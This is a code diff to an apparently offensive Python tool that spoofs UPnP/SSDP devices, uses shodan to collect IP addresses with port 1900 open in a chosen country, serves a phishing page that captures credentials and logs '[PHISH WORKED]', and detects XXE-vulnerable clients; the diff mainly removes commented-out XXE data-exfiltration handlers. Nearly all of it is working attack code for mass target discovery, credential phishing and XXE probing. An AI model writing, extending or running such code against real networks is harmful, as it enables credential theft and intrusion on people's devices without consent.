@@ -95,7 +95,9 @@ def get_arguments():
 def get_vuln_ips(country):
     if os.geteuid() != 0:
         exit('Root priveleges required')
-    print('\033[96m' + '---------------------------\n' + ' Obtaining IP addresses with open \n 1900 port in the specified country\r\n' + '---------------------------')
+    print('\033[96m' + '---------------------------\n' + 
+          ' Obtaining IP addresses with open \n 1900 port in the specified country\r\n' + 
+          '---------------------------')
     os.system(f'''shodan download --limit 100 {country} "port:1900 \
         country:{country}"''')
     os.system(f"shodan parse {country}.json.gz --fields ip_str > \
@@ -617,21 +619,6 @@ def create_class(upnp_args):
             xml_file = template.substitute(variables)
             return xml_file
 
-        # @staticmethod
-        # def create_service_xml():
-        #     # Создает XML-файл дескриптора службы
-        #     # ***Not yet implemented***
-            
-        #     if 'service.xml' in template_dir:
-        #         variables = {'local_ip': local_ip,
-        #                      'local_port': local_port}
-        #         input_file = open(template_dir + '/service.xml')
-        #         template = Template(input_file.read())
-        #         xml_file = template.substitute(variables)
-        #     else:
-        #         xml_file = '.'
-        #     return xml_file
-
         @staticmethod
         def create_phish_html():
             # Создает фишинговую страницу, которая открывается, 
@@ -643,22 +630,7 @@ def create_class(upnp_args):
             phishing_page = template.substitute(variables)
             return phishing_page
 
-        # @staticmethod
-        # def create_exfil_dtd():
-        #     """
-        #     Builds the required page for data exfiltration when used with the
-        #     xxe-exfil template.
-        #     """
-        #     if 'xxe-exfil' in template_dir:
-        #         variables = {'local_ip': local_ip,
-        #                      'local_port': local_port}
-        #         input_file = open(template_dir + '/data.dtd')
-        #         template = Template(input_file.read())
-        #         exfil_page = template.substitute(variables)
-        #     else:
-        #         exfil_page = '.'
-        #     return exfil_page
-
+        
         # Метод переопределен с целью перехвата исключений закрытого соединения
         def handle(self):
             try:
@@ -677,24 +649,12 @@ def create_class(upnp_args):
                 self.send_header('Content-type', 'application/xml')
                 self.end_headers()
                 self.wfile.write(self.create_device_xml().encode())
-            # elif self.path == '/ssdp/service-desc.xml':
-            #     # Not yet implemented
-            #     self.send_response(200)
-            #     self.send_header('Content-type', 'application/xml')
-            #     self.end_headers()
-            #     self.wfile.write(self.create_service_xml().encode())
             elif self.path == '/ssdp/xxe.html':
                 # Доступ указывает на уязвимость XXE
                 self.send_response(200)
                 self.send_header('Content-type', 'application/xml')
                 self.end_headers()
                 self.wfile.write('.'.encode())
-            # elif self.path == '/ssdp/data.dtd':
-            #     # Used for XXE exploitation
-            #     self.send_response(200)
-            #     self.send_header('Content-type', 'application/xml')
-            #     self.end_headers()
-            #     self.wfile.write(self.create_exfil_dtd().encode())
             elif self.path == '/favicon.ico':
                 self.send_response(404)
                 self.wfile.write('Not found.'.encode())
@@ -793,18 +753,6 @@ def create_class(upnp_args):
                     address, credentials)
                 print(data)
                 self.add_to_log(data)
-            # elif 'data.dtd' in self.path:
-            #     data = PC.xxe_box + "Host: {}, User-Agent: {}\n".format(
-            #         address, agent)
-            #     data += "               {} {}".format(verb, path)
-            #     print(data)
-            #     self.add_to_log(data)
-            # elif 'exfiltrated' in self.path:
-            #     data = PC.exfil_box + "Host: {}, User-Agent: {}\n".format(
-            #         address, agent)
-            #     data += "               {} {}".format(verb, path)
-            #     print(data)
-            #     self.add_to_log(data)
             elif 'index.html' in self.path:
                 print('\033[91m [PHISH WORKED] Host: {}, User-Agent: {}'.format(
                     address, agent))
